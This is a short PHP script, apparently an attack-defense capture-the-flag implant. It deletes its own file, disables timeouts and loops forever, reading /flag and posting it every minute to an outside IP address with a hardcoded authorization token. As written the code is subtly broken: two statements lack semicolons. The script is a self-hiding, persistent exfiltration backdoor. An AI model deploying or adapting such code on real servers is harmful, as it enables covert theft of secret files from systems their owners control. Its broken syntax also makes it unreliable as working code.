<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
while (1){
    $flag=substr(file_get_contents('/flag'),0,48);
    $data=json_encode(
        array(
            'flag'=>$flag
        )
    )
    $query=http_build_query($data);
    $option=array(
        'http'=>array(
            'method'=>'POST',
            'Authorization'=>'91ed264fc48572e365c7ecca8a72ebf5',
            'Content-Type'=>'application/json',
            'content'=>$data
        )
    )
    $result=file_get_contents('http://188.100.4.201:19999/api/flag',false,stream_context_create($option));
    sleep(60);
} 
?>